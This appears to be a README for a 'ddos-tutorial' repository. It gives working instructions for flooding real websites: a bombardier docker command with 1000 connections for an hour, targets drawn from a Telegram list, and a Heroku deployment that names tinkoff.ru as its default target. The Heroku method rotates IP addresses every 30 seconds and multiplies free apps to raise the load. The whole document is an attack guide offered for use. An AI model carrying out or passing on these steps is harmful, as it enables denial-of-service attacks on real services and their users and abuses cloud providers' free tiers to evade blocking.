# Method 1. Local machine way
1. Install VPN if you're in Ukraine. I'm using (https://www.hotspotshield.com/);
2. Install docker https://docs.docker.com/get-docker/;
3. Choose one of the sites listed here: https://t.me/itarmyofukraine2022/5;
4. Run `docker run -ti --rm alpine/bombardier -c 1000 -d 3600s -l <your url>`;

# Method 2. Cloud way (with node.js example) (linux/mac)
1. Create account on https://www.heroku.com/
2. (Optional) Add billing information(no payment will happen!). This will give more free credits to your account
3. Create new application
4. Install heroku cli: https://devcenter.heroku.com/articles/heroku-cli#install-the-heroku-cli
5. Edit `reload.sh` file and insert your app name there.
6. Deploy there code from this repo:
```
$ heroku login
$ cd ddos-tutorial
$ heroku git:remote -a <<your-app-name>>
$ git add .
$ git commit -am "make it better"
$ git push heroku master
```
6. Run in terminal `sh reload.sh` - this script will reload heroku app each 30s, so you will get new IP address each 30 seconds.
7. In order to change destination, please change in the code (`index.js` file) `https://www.tinkoff.ru/` to any other destination and redeploy app: 
```
$ git add .
$ git commit -m "make it better"
$ git push heroku master
```
If you want to see logs from your app: 
```
$ heroku logs -t -a <<your-app-name>>
```
## Multi app DDOS

If you want, you can create more than 1 application with free account in order to generate more load. To do so, you need: 
1. Create one more application in heroku UI
2. Push code to newly created app: 
```
$ git remote rename heroku heroku-<<n>>  ## This command will rename current origin under name `heroku` to `heroku-<<n>>. Where n is number of the previous app
$ heroku git:remote -a <<your-app-name-2>> ## This command set new app origin to name `heroku`.
$ git push heroku master  ## This now will push your code to new app
```
Notice that first app will be available for pushes under name `heroku-<<n>>` and newly created under `heroku`. As well `heroku-<<n>>` should be uniq per origin, so n should be incremental.

Push example for 2 apps: 
```
$ git push heroku-1 master ## Pushes new code to <<your-app-name>>
$ git push heroku master ## Pushes new code to <<your-app-name-2>>
```

3. Change `reload.sh` file and add after line `heroku restart -a <<your-app-name>>` similar line with `heroku restart -a <<your-app-name-2>>`
4. Restart sh script. 

You can repeat this untill you will reach maximum amount of dynos per account. 
After, you will need to pay in order to get more apps. 
